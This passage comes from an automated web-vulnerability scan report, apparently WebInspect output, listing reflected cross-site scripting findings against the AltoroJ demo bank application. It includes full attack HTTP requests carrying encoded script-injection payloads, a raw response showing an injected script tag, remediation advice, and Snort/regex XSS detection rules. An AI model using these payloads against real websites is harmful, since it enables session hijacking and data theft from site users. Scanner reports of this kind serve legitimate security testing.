&lt;/li&gt;&lt;li&gt;Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.&lt;/li&gt;&lt;li&gt;Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).&lt;/li&gt;&lt;li&gt;Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. &lt;/li&gt;&lt;/ul&gt;</SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText>&lt;br /&gt;
+
+View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.
+
+
+The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 
+
+
+
+Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.</SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText>&lt;br /&gt;&lt;b&gt;For Development:&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;
+Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 
+
+verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 
+
+to convert it to a numeric data type in your programming language. &lt;br /&gt;&lt;br /&gt;&lt;b&gt;PHP:&lt;/b&gt; intval("0".$_GET['q']);   &lt;br /&gt;&lt;br /&gt;&lt;b&gt;ASP.NET:&lt;/b&gt; 
+
+int.TryParse(Request.QueryString["q"], out val); &lt;br /&gt;&lt;br /&gt;
+
+The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 
+
+text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 
+
+value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. &lt;br /&gt;&lt;br /&gt;
+
+Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 
+
+These should be used to sanitize all input before it is displayed to the client. &lt;br /&gt;&lt;br /&gt;&lt;b&gt;PHP:&lt;/b&gt;  string htmlspecialchars (string string 
+
+[, int quote_style])&lt;br /&gt;&lt;br /&gt;&lt;b&gt;ASP.NET:&lt;/b&gt; Server.HTMLEncode (strHTML String)
+
+
+
+&lt;br /&gt;&lt;br /&gt;
+
+When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 
+
+sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 
+
+all non-alphanumeric characters using hex (\xHH) encoding.&lt;br /&gt;&lt;br /&gt;
+
+If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 
+
+or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 
+
+do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:&lt;br /&gt;&lt;br /&gt;
+
+s = s.replace(/&amp;amp;/g,'&amp;amp;amp;').replace(/"/i,'&amp;amp;quot;').replace(/&amp;lt;/i,'&amp;amp;lt;').replace(/&amp;gt;/i,'&amp;amp;gt;').replace(/'/i,'&amp;amp;apos;')
+
+
+&lt;br /&gt;&lt;br /&gt;
+
+Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 
+
+data for display should be done immediately before displaying it.
+
+&lt;b&gt;&lt;br /&gt;&lt;br /&gt;
+
+
+For Security Operations:&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;
+
+Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 
+
+selected character set, can help to prevent Cross-Site Scripting attacks. &lt;br /&gt;&lt;br /&gt;
+
+Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 
+
+protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 
+
+EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. &lt;br /&gt;&lt;br /&gt;
+
+An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 
+
+Scripting. &lt;br /&gt;&lt;br /&gt;&lt;b&gt;Regex for a simple XSS attack:&lt;/b&gt;&lt;br /&gt;
+/((\%3C)|&amp;lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&amp;gt;)/ix &lt;br /&gt;&lt;br /&gt;
+
+The above regular expression would be added into a new Snort rule as follows: &lt;br /&gt;&lt;br /&gt;
+
+alert tcp $EXTERNAL_NET any -&amp;gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 
+
+pcre:"/((\%3C)|&amp;lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&amp;gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) &lt;br /&gt;&lt;br /&gt;&lt;b&gt;Paranoid regex for 
+
+XSS attacks:&lt;/b&gt;&lt;br /&gt;
+/((\%3C)|&amp;lt;)[^\n]+((\%3E)|&amp;gt;)/I &lt;br /&gt;&lt;br /&gt;
+
+This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 
+
+followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 
+
+server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.
+
+&lt;br /&gt;&lt;br /&gt;&lt;b&gt;For QA:&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;
+
+
+Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 
+
+about manually testing your application for Cross-Site Scripting.</SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText>&lt;br /&gt;&lt;br /&gt;&lt;b&gt;OWASP Cross-Site Scripting Information&lt;/b&gt;&lt;br /&gt;&lt;a href="https://www.owasp.org/index.php/XSS"&gt;https://www.owasp.org/index.php/XSS&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;CERT&lt;/b&gt;&lt;br /&gt;&lt;a href="http://www.cert.org/advisories/CA-2000-02.html"&gt;http://www.cert.org/advisories/CA-2000-02.html&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;Apache&lt;/b&gt;&lt;br /&gt;&lt;a href="http://httpd.apache.org/info/css-security/apache_specific.html"&gt;http://httpd.apache.org/info/css-security/apache_specific.html&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;b&gt;CGISecurity&lt;/b&gt;&lt;br /&gt;&lt;a href="https://www.cgisecurity.com/xss-faq.html "&gt;https://www.cgisecurity.com/xss-faq.html&lt;/a&gt;</SectionText></ReportSection><RawResponse>HTTP/1.1 200
+Content-Type: text/html;charset=ISO-8859-1
+Content-Length: 7192
+Date: Fri, 27 Dec 2024 06:26:20 GMT
+Keep-Alive: timeout=20
+Connection: keep-alive
+
+
+
+
+
+
+
+ 
+    
+
+ 
+
+&lt;!-- BEGIN HEADER --&gt;
+&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
+
+&lt;html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" &gt;
+
+
+
+&lt;head&gt;
+	&lt;title&gt;Altoro Mutual&lt;/title&gt;
+  &lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /&gt;
+  &lt;link href="/altoromutual/style.css" rel="stylesheet" type="text/css" /&gt;
+&lt;/head&gt;
+&lt;body style="margin-top:5px;"&gt;
+
+&lt;div id="header" style="margin-bottom:5px; width: 99%;"&gt;
+  &lt;form id="frmSearch" method="get" action="/altoromutual/search.jsp"&gt;
+	  &lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;
+		  &lt;tr&gt;
+		      &lt;td rowspan="2"&gt;&lt;a id="HyperLink1" href="/altoromutual/index.jsp"&gt;&lt;img src="/altoromutual/images/logo.gif" width=283 height=80/&gt;&lt;/a&gt;&lt;/td&gt;
+			  &lt;td align="right" valign="top"&gt;
+  			  &lt;a id="LoginLink" href="/altoromutual/login.jsp"&gt;&lt;font style="font-weight: bold; color: red;"&gt;Sign In&lt;/font&gt;&lt;/a&gt; | &lt;a id="HyperLink3" href="/altoromutual/index.jsp?content=inside_contact.htm"&gt;Contact Us&lt;/a&gt; | &lt;a id="HyperLink4" href="/altoromutual/feedback.jsp"&gt;Feedback&lt;/a&gt; | &lt;label for="txtSearch"&gt;Search&lt;/label&gt;
+          &lt;input type="text" name="query" id="query" accesskey="S" /&gt;
+          &lt;input type="submit" value="Go" /&gt;
+			  &lt;/td&gt;
+		  &lt;/tr&gt;
+		  &lt;tr&gt;
+			  &lt;td align="right" style="background-image:url('/altoromutual/images/gradient.jpg');padding:0px;margin:0px;"&gt;&lt;img src="/altoromutual/images/header_pic.jpg" alt="" width=354 height=60/&gt;&lt;/td&gt;
+		  &lt;/tr&gt;
+	  &lt;/table&gt;
+	&lt;/form&gt;
+&lt;/div&gt;
+
+&lt;table cellspacing="0" width="100%"&gt;
+  &lt;tr&gt;
+    &lt;td width="25%" class="bt br bb"&gt;&lt;div id="Header1"&gt;&lt;img id="Image1" src="/altoromutual/images/pf_lock.gif" width=12 height=14 style="vertical-align: bottom;" alt="Secure Login"/&gt; &amp;nbsp; &lt;a id="AccountLink" href="/altoromutual/login.jsp" class="focus" &gt;ONLINE BANKING LOGIN&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
+    &lt;td width="25%" class="cc bt br bb"&gt;&lt;div id="Header2"&gt;&lt;a id="LinkHeader2" class="focus" href="/altoromutual/index.jsp?content=personal.htm" &gt;PERSONAL&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
+    &lt;td width="25%" class="cc bt br bb"&gt;&lt;div id="Header3"&gt;&lt;a id="LinkHeader3" class="focus" href="/altoromutual/index.jsp?content=business.htm" &gt;SMALL BUSINESS&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
+    &lt;td width="25%" class="cc bt bb"&gt;&lt;div id="Header4"&gt;&lt;a id="LinkHeader4" class="focus" href="/altoromutual/index.jsp?content=inside.htm"&gt;INSIDE ALTORO MUTUAL&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;
+  &lt;/tr&gt;
+  &lt;tr&gt;
+  
+  &lt;!-- END HEADER --&gt;
+
+
+&lt;div id="wrapper" style="width: 99%;"&gt;
+	 
+
+&lt;!-- TOC BEGIN --&gt;     
+     &lt;td valign="top" class="cc br bb"&gt;
+        &lt;br style="line-height: 10px;"/&gt;
+        
+        &lt;a id="CatLink1" class="subheader" href="index.jsp?content=personal.htm"&gt;PERSONAL&lt;/a&gt;
+        &lt;ul class="sidebar"&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink1" href="index.jsp?content=personal_deposit.htm"&gt;Deposit Product&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink2" href="index.jsp?content=personal_checking.htm"&gt;Checking&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink3" href="index.jsp?content=personal_loans.htm"&gt;Loan Products&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink4" href="index.jsp?content=personal_cards.htm"&gt;Cards&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink5" href="index.jsp?content=personal_investments.htm"&gt;Investments &amp;amp; Insurance&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink6" href="index.jsp?content=personal_other.htm"&gt;Other Services&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+
+        &lt;a id="CatLink2" class="subheader" href="index.jsp?content=business.htm"&gt;SMALL BUSINESS&lt;/a&gt;
+        &lt;ul class="sidebar"&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink7" href="index.jsp?content=business_deposit.htm"&gt;Deposit Products&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink8" href="index.jsp?content=business_lending.htm"&gt;Lending Services&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink9" href="index.jsp?content=business_cards.htm"&gt;Cards&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink10" href="index.jsp?content=business_insurance.htm"&gt;Insurance&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink11" href="index.jsp?content=business_retirement.htm"&gt;Retirement&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink12" href="index.jsp?content=business_other.htm"&gt;Other Services&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+
+        &lt;a id="CatLink3" class="subheader" href="index.jsp?content=inside.htm"&gt;INSIDE ALTORO MUTUAL&lt;/a&gt;
+        &lt;ul class="sidebar"&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink13" href="index.jsp?content=inside_about.htm"&gt;About Us&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink14" href="index.jsp?content=inside_contact.htm"&gt;Contact Us&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink15" href="cgi.exe"&gt;Locations&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink16" href="index.jsp?content=inside_investor.htm"&gt;Investor Relations&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink17" href="index.jsp?content=inside_press.htm"&gt;Press Room&lt;/a&gt;&lt;/li&gt;
+            &lt;li&gt;&lt;a id="MenuHyperLink18" href="index.jsp?content=inside_careers.htm"&gt;Careers&lt;/a&gt;&lt;/li&gt;
+			&lt;li&gt;&lt;a id="MenuHyperLink19" href="subscribe.jsp"&gt;Subscribe&lt;/a&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+    &lt;/td&gt;
+&lt;!-- TOC END --&gt;
+
+    &lt;td valign="top" colspan="3" class="bb"&gt;
+		
+		
+		
+			
+			&lt;p&gt;Failed due to The requested resource [/altoromutual/static/inside_contact.htm&lt;script src=//24666 id="] is not available&lt;/p&gt;
+ 		
+    &lt;/td&gt;
+	
+&lt;/div&gt;
+
+ 
+
+&lt;!-- BEGIN FOOTER --&gt;
+
+
+&lt;/tr&gt;
+&lt;/table&gt;
+&lt;div id="footer" style="width: 99%;"&gt;
+    &lt;a id="HyperLink5" href="/altoromutual/index.jsp?content=privacy.htm"&gt;Privacy Policy&lt;/a&gt;
+    &amp;nbsp;&amp;nbsp;|&amp;nbsp;&amp;nbsp;
+    &lt;a id="HyperLink6" href="/altoromutual/index.jsp?content=security.htm"&gt;Security Statement&lt;/a&gt;
+    &amp;nbsp;&amp;nbsp;|&amp;nbsp;&amp;nbsp;
+    &lt;a id="HyperLink6" href="/altoromutual/status_check.jsp"&gt;Server Status Check&lt;/a&gt;
+    &amp;nbsp;&amp;nbsp;|&amp;nbsp;&amp;nbsp; 
+    &lt;a id="HyperLink6" href="/altoromutual/swagger/index.html"&gt;REST API&lt;/a&gt;
+    &amp;nbsp;&amp;nbsp;|&amp;nbsp;&amp;nbsp; 
+    &amp;copy;&amp;nbsp;2024 Altoro Mutual, Inc.
+    &lt;span style="color:red;font-weight:bold;font-style:italic;float:right"&gt;This web application is open source!&lt;span style="color:black;font-style:italic;font-weight:normal;float:right"&gt;&amp;nbsp;&lt;a href="https://github.com/AppSecDev/AltoroJ/"&gt;Get your copy from GitHub&lt;/a&gt; and take advantage of advanced features&lt;/span&gt;&lt;/span&gt;
+	&lt;br&gt;&lt;br&gt;&lt;br&gt;
+    &lt;div class="disclaimer"&gt;
+        The AltoroJ website is published by IBM Corporation for the sole purpose of
+        demonstrating the effectiveness of IBM products in detecting web application
+        vulnerabilities and website defects. This site is not a real banking site. Similarities,
+        if any, to third party products and/or websites are purely coincidental. This site is
+        provided "as is" without warranty of any kind, either express or implied. IBM does
+        not assume any risk in relation to your use of this website. For more information,
+        please go to &lt;a id="HyperLink7" href="http://www-142.ibm.com/software/products/us/en/subcategory/SWI10" &gt;http://www-142.ibm.com/software/products/us/en/subcategory/SWI10&lt;/a&gt;.&lt;br /&gt;&lt;br /&gt;
+
+        Copyright &amp;copy; 2008, 2024, IBM Corporation, All rights reserved.
+    &lt;/div&gt;
+&lt;/div&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+&lt;!-- END FOOTER --&gt;</RawResponse></Issue><Issue><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><URL>http://ec2-18-228-23-75.sa-east-1.compute.amazonaws.com:7272/altoromutual/sendFeedback</URL><Scheme>http</Scheme><Host>ec2-18-228-23-75.sa-east-1.compute.amazonaws.com</Host><Port>7272</Port><AttackMethod>POST</AttackMethod><AttackParam>name</AttackParam><VulnerableSession>POST /altoromutual/sendFeedback HTTP/1.1
+Referer: http://ec2-18-228-23-75.sa-east-1.compute.amazonaws.com:7272/altoromutual/feedback.jsp
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 201
+Accept: */*
+Pragma: no-cache
+Accept-Encoding: gzip, deflate
+Host: ec2-18-228-23-75.sa-east-1.compute.amazonaws.com:7272
+User-Agent: Mozilla/5.0 (Windows NT 6.5; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
+Connection: Keep-Alive
+X-WIPP: AscVersion=23.2.0.65
+X-Scan-Memo: Category="Audit.Attack";SID="3ACDFE528EDF89C0F0E6C2E41EA2EE2E";PSID="9A88F60DE274A9929EB3CDBB67F81EAE";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="name";AttackParamIndex="1";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="Jason%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2536%2533%2537%2537%2535%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tht="40";
+X-RequestManager-Memo: stid="31";stmi="0";sc="1";rid="47de18cb";
+X-Request-Memo: rid="cffbd010";sc="1";thid="39";
+Cookie: CustomCookie=WebInspect205969ZX91D8062297F94A3DAE8562420D869CBCY10EF;JSESSIONID=32BAADF770AA086F9D2880A2869DB2A0
+
+cfile=comments.txt&amp;name=Jason%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%36%33%37%37%35%29%3c%2f%73%43%72%49%70%54%3e&amp;email_addr=John.Doe%40somewhere.com&amp;subject=12345&amp;comments=12345&amp;submit=%20Submit%20</VulnerableSession><TriggerSession>POST /altoromutual/sendFeedback HTTP/1.1
+Referer: http://ec2-18-228-23-75.sa-east-1.compute.amazonaws.com:7272/altoromutual/feedback.jsp
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 114
+Accept: */*
+Pragma: no-cache
+Accept-Encoding: gzip, deflate
+Host: ec2-18-228-23-75.sa-east-1.compute.amazonaws.com:7272
+Connection: Keep-Alive
+X-WIPP: AscVersion=23.2.0.65
+X-Scan-Memo: Category="Crawl";SID="9A88F60DE274A9929EB3CDBB67F81EAE";PSID="350B49237BA3A48B5CF853D2AF0E984E";SessionType="Crawl";CrawlType="Form";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="action";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tht="31";
+X-RequestManager-Memo: stid="25";stmi="0";sc="1";rid="ad995e85";
+X-Request-Memo: rid="4397e790";sc="1";thid="37";
+Cookie: CustomCookie=WebInspect205969ZX91D8062297F94A3DAE8562420D869CBCY10EF;JSESSIONID=9BF47E8C04470A9ACF572A897CDA1350
+
+cfile=comments.txt&amp;name=Jason&amp;email_addr=John.Doe%40somewhere.com&amp;subject=12345&amp;comments=12345&amp;submit=%20Submit%20</TriggerSession><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting: Reflected</Name><ReportSection><Name>Summary</Name><SectionText>&lt;hp-img src="xss.rgc" /&gt;&lt;br /&gt;Cross-Site Scripting vulnerability found in Post parameter name.  The following attack uses plain encoding:&lt;br&gt;&lt;br&gt;&amp;lt;sCrIpT&amp;gt;alert(63775)&amp;lt;/sCrIpT&amp;gt;&lt;br&gt;&lt;br/&gt;&lt;br/&gt;A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.</SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText>&lt;br /&gt;
+Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. &lt;br /&gt;&lt;br /&gt;
+
+The implications of successful Cross-Site Scripting attacks are:
+
+&lt;ul&gt;&lt;li&gt;Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. &lt;/li&gt;&lt;li&gt;Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 
+
+&lt;/li&gt;&lt;li&gt;Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
+&lt;/li&gt;&lt;li&gt;Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.&lt;/li&gt;&lt;li&gt;	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . &lt;/li&gt;&lt;li&gt;Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. &lt;/li&gt;&lt;li&gt;	Manipulation of user settings - Attackers can change user settings for nefarious purposes. &lt;/li&gt;&lt;li&gt;Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. &lt;/li&gt;&lt;li&gt;Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.&lt;/li&gt;&lt;li&gt;Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).&lt;/li&gt;&lt;li&gt;Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. &lt;/li&gt;&lt;/ul&gt;</SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText>&lt;br /&gt;
+
+View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.
+
+
+The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 
+
+
+
+Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.</SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText>&lt;br /&gt;&lt;b&gt;For Development:&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;
+Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 
+
+verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 
+
+to convert it to a numeric data type in your programming language. &lt;br /&gt;&lt;br /&gt;&lt;b&gt;PHP:&lt;/b&gt; intval("0".$_GET['q']);   &lt;br /&gt;&lt;br /&gt;&lt;b&gt;ASP.NET:&lt;/b&gt; 
+
+int.TryParse(Request.QueryString["q"], out val); &lt;br /&gt;&lt;br /&gt;
+
+The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 
+
+text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 
+
+value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. &lt;br /&gt;&lt;br /&gt;
+
+Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 
+
+These should be used to sanitize all input before it is displayed to the client. &lt;br /&gt;&lt;br /&gt;&lt;b&gt;PHP:&lt;/b&gt;  string htmlspecialchars (string string 
+
+[, int quote_style])&lt;br /&gt;&lt;br /&gt;&lt;b&gt;ASP.NET:&lt;/b&gt; Server.HTMLEncode (strHTML String)
+
+
+
+&lt;br /&gt;&lt;br /&gt;
+
+When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 
+
+sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 
+
+all non-alphanumeric characters using hex (\xHH) encoding.&lt;br /&gt;&lt;br /&gt;
+
+If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 
+
+or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 
+
+do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:&lt;br /&gt;&lt;br /&gt;
+
+s = s.replace(/&amp;amp;/g,'&amp;amp;amp;').replace(/"/i,'&amp;amp;quot;').replace(/&amp;lt;/i,'&amp;amp;lt;').replace(/&amp;gt;/i,'&amp;amp;gt;').replace(/'/i,'&amp;amp;apos;')
+
+
+&lt;br /&gt;&lt;br /&gt;
+
+Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 
+
+data for display should be done immediately before displaying it.
+
+&lt;b&gt;&lt;br /&gt;&lt;br /&gt;
+
+
+For Security Operations:&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;
+
+Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 
+
+selected character set, can help to prevent Cross-Site Scripting attacks. &lt;br /&gt;&lt;br /&gt;
+
+Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 
+
+protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 
+
+EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. &lt;br /&gt;&lt;br /&gt;
+
+An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 
+
+Scripting. &lt;br /&gt;&lt;br /&gt;&lt;b&gt;Regex for a simple XSS attack:&lt;/b&gt;&lt;br /&gt;
+/((\%3C)|&amp;lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&amp;gt;)/ix &lt;br /&gt;&lt;br /&gt;
+
+The above regular expression would be added into a new Snort rule as follows: &lt;br /&gt;&lt;br /&gt;
+
+alert tcp $EXTERNAL_NET any -&amp;gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 
+
+pcre:"/((\%3C)|&amp;lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&amp;gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) &lt;br /&gt;&lt;br /&gt;&lt;b&gt;Paranoid regex for 
+
+XSS attacks:&lt;/b&gt;&lt;br /&gt;
+/((\%3C)|&amp;lt;)[^\n]+((\%3E)|&amp;gt;)/I &lt;br /&gt;&lt;br /&gt;
+
+This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 
+
+followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 
+
+server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.
+
+&lt;br /&gt;&lt;br /&gt;&lt;b&gt;For QA:&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;
+
+
+Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 
+
